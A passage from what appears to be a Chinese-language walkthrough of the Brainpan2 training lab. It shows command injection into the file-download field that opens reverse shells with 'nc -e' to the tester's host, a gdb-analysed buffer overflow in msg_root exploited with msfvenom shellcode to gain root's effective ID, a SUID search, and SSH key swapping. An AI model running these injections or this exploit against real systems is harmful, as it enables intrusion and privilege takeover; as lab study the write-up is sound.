addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>可以从输出看到;后面的命令已经被成功执行</p>
<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>

<p>监听6666端口，成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ ls  </span><br><span class="line">ls</span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>

<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>

<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
<p>这是用户提供有效输入时的场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>

<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>

<p>填好二个参数,并执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p>读取flag看看，看起来好像成功了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">$ cat whatif.txt</span><br><span class="line">cat whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- /</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID/SGID执行权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ cat brainpan.cfg</span><br><span class="line">cat brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>

<p>启动该应用程序并通过我的机器进行了连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>

<p>nc连接之后，执行反弹命令获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>

<p>成功获取了puck用户的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p>查看puck的文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>

<p>不是空的bash_history？真奇怪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ls -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line">ls</span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line">ls -latr</span><br><span class="line">cat .bash_history </span><br><span class="line">ls</span><br><span class="line">mkdir .backup</span><br><span class="line">mv .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ls -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>

<p>因此，puck用户可以通过ssh登录到/目录。我做到了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ mv .ssh .ssh-old</span><br><span class="line">mv .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .</span><br><span class="line">cp -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls 